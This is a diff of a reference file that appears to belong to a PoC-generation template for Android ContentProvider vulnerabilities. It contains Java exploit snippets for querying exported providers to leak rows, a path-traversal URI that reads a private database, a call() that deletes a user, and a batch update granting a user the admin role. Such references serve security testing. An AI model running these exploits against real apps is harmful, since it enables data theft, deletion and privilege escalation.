@@ -7,6 +7,14 @@ description: Provider PoC reference covering data exposure, SQL injection, path 
 
 Use this reference for exported or grant-reachable `ContentProvider` attack paths. Provider PoCs usually fit `direct-trigger` mode, with `returned-handle` used for grant-based FileProvider chains.
 
+## Template Wiring
+
+These snippets show the exploit body shape. In the current template:
+
+- keep provider access in a small helper method
+- register one exploit id per provider path in `ExploitRegistry`
+- add support components only when a grant or interception step truly needs them
+
 ## Construction Matrix
 
 | Vulnerability | Exploit mode | Typical support | Visible success |
@@ -19,29 +27,37 @@ Use this reference for exported or grant-reachable `ContentProvider` attack path
 | `getType()` oracle | probe-only `direct-trigger` | none | existence or state leak is observed |
 | FileProvider misconfig | `returned-handle` or `direct-trigger` | none | private file URI becomes readable |
 
-## Pattern 1 - Query-Based Read or Injection
+## Shared Inputs
 
-Use for `ProviderDataLeakExploit` and many `ProviderSqlInjectionExploit` cases.
+- victim provider authority and path
+- attacker-controlled query args, URI segments, method name, or batch body
+- whether the path is direct-open or grant-reuse
+- visible success signal
+
+## Pattern 1 - Query-Based Read Or Injection
+
+Use for data leaks and many SQL injection cases.
 
 ```java
-public final class ProviderDataLeakExploit extends Exploit {
-    public ProviderDataLeakExploit(Context context) {
-        super(context);
-    }
-
-    @Override
-    public void execute() {
-        Uri uri = Uri.parse("content://com.target.provider/users");
-        try (Cursor cursor = context.getContentResolver().query(uri, null, null, null, null)) {
-            if (cursor != null) {
-                log("Returned rows: " + cursor.getCount());
-            } else {
-                log("Query returned null cursor");
-            }
-        } catch (Exception e) {
-            log("Query failed: " + e.getMessage());
+private static void runProviderQueryLeak(Context context) {
+    Uri uri = Uri.parse("content://com.target.provider/users");
+    try (Cursor cursor = context.getContentResolver().query(uri, null, null, null, null)) {
+        if (cursor != null) {
+            Log.i("PoC", "Returned rows: " + cursor.getCount());
+        } else {
+            Log.i("PoC", "Query returned null cursor");
         }
+    } catch (Exception e) {
+        Log.e("PoC", "Query failed", e);
     }
+}
+```
+
+Registration shape:
+
+```java
+static {
+    register("provider-query", "Query Exported Provider", () -> runProviderQueryLeak(appContext));
 }
 ```
 
@@ -49,92 +65,99 @@ SQL injection variant:
 
 - replace `selection`, `selectionArgs`, or `sortOrder` with the verified attacker-controlled injection point
 
-## Pattern 2 - File or Path Access
+Fill with:
 
-Use for `ProviderPathTraversalExploit` and many FileProvider cases.
+- real `content://` authority and path
+- exact projection, selection, selection args, or sort clause that proves the finding
+
+## Pattern 2 - File Or Path Access
+
+Use for traversal and many FileProvider cases.
 
 ```java
-public final class ProviderPathTraversalExploit extends Exploit {
-    public ProviderPathTraversalExploit(Context context) {
-        super(context);
-    }
-
-    @Override
-    public void execute() {
-        Uri uri = Uri.parse("content://com.target.provider/files/../../../data/data/com.target/databases/secret.db");
-        try (ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, "r")) {
-            if (pfd != null) {
-                log("openFileDescriptor() accepted traversal URI");
-            } else {
-                log("File descriptor was null");
-            }
-        } catch (Exception e) {
-            log("openFileDescriptor() failed: " + e.getMessage());
+private static void runProviderPathTraversal(Context context) {
+    Uri uri = Uri.parse("content://com.target.provider/files/../../../data/data/com.target/databases/secret.db");
+    try (ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, "r")) {
+        if (pfd != null) {
+            Log.i("PoC", "openFileDescriptor() accepted traversal URI");
+        } else {
+            Log.i("PoC", "File descriptor was null");
         }
+    } catch (Exception e) {
+        Log.e("PoC", "openFileDescriptor() failed", e);
     }
+}
+```
+
+Registration shape:
+
+```java
+static {
+    register("provider-file", "Open Provider File Path", () -> runProviderPathTraversal(appContext));
 }
 ```
 
 Use when:
 
-- the verified finding shows attacker-controlled URI segments flowing into `openFile()` or equivalent file access APIs
+- attacker-controlled URI segments flow into `openFile()` or equivalent file APIs
 
-## Pattern 3 - Custom `call()` or Batch Abuse
+## Pattern 3 - Custom `call()` Or Batch Abuse
 
-Use for `ProviderCallExposeExploit` and `ProviderBatchAbuseExploit`.
+Use for custom method exposure or unauthorized writes.
 
 ```java
-public final class ProviderCallExposeExploit extends Exploit {
-    public ProviderCallExposeExploit(Context context) {
-        super(context);
-    }
-
-    @Override
-    public void execute() {
-        Uri uri = Uri.parse("content://com.target.provider");
-        Bundle extras = new Bundle();
-        extras.putString("user_id", "1");
-        try {
-            Bundle result = context.getContentResolver().call(uri, "deleteUser", null, extras);
-            log("call() returned: " + result);
-        } catch (Exception e) {
-            log("call() failed: " + e.getMessage());
-        }
+private static void runProviderCallExpose(Context context) {
+    Uri uri = Uri.parse("content://com.target.provider");
+    Bundle extras = new Bundle();
+    extras.putString("user_id", "1");
+    try {
+        Bundle result = context.getContentResolver().call(uri, "deleteUser", null, extras);
+        Log.i("PoC", "call() returned: " + result);
+    } catch (Exception e) {
+        Log.e("PoC", "call() failed", e);
     }
 }
 ```
 
 ```java
-public final class ProviderBatchAbuseExploit extends Exploit {
-    public ProviderBatchAbuseExploit(Context context) {
-        super(context);
-    }
+private static void runProviderBatchAbuse(Context context) {
+    Uri uri = Uri.parse("content://com.target.provider/users");
+    ArrayList<ContentProviderOperation> operations = new ArrayList<>();
+    ContentValues values = new ContentValues();
+    values.put("role", "admin");
+    operations.add(ContentProviderOperation.newUpdate(uri)
+        .withSelection("user_id=?", new String[]{"10001"})
+        .withValues(values)
+        .build());
 
-    @Override
-    public void execute() {
-        Uri uri = Uri.parse("content://com.target.provider/users");
-        ArrayList<ContentProviderOperation> operations = new ArrayList<>();
-        ContentValues values = new ContentValues();
-        values.put("role", "admin");
-        operations.add(ContentProviderOperation.newUpdate(uri)
-            .withSelection("user_id=?", new String[]{"10001"})
-            .withValues(values)
-            .build());
-
-        try {
-            ContentProviderResult[] results = context.getContentResolver()
-                .applyBatch("com.target.provider", operations);
-            log("applyBatch() result count: " + results.length);
-        } catch (Exception e) {
-            log("applyBatch() failed: " + e.getMessage());
-        }
+    try {
+        ContentProviderResult[] results = context.getContentResolver()
+            .applyBatch("com.target.provider", operations);
+        Log.i("PoC", "applyBatch() result count: " + results.length);
+    } catch (Exception e) {
+        Log.e("PoC", "applyBatch() failed", e);
     }
 }
 ```
 
-## Pattern 4 - Oracle or Grant-Oriented Validation
+Registration shape:
 
-Use for `ProviderGetTypeInfoLeakExploit` or FileProvider misconfiguration.
+```java
+static {
+    register("provider-call", "Invoke Provider call()", () -> runProviderCallExpose(appContext));
+    register("provider-batch", "Apply Provider Batch", () -> runProviderBatchAbuse(appContext));
+}
+```
+
+Fill with:
+
+- real `call()` method name and extras
+- real authority string for `applyBatch(...)`
+- exact row selector and write payload that proves unauthorized mutation
+
+## Pattern 4 - Oracle Or Grant-Oriented Validation
+
+Use for `getType()` probes or FileProvider grant reuse.
 
 Construction rules:
 
@@ -145,3 +168,9 @@ Success signal:
 
 - distinguishable `getType()` result
 - actual readable file content or accepted file descriptor
+
+## Construction Notes
+
+- prefer one direct query or file-open helper when the bug is already visible without a multi-step grant chain
+- keep grant reuse explicit when the PoC depends on a returned `content://` handle
+- `getType()` is usually a confirmation probe, not the main exploit body
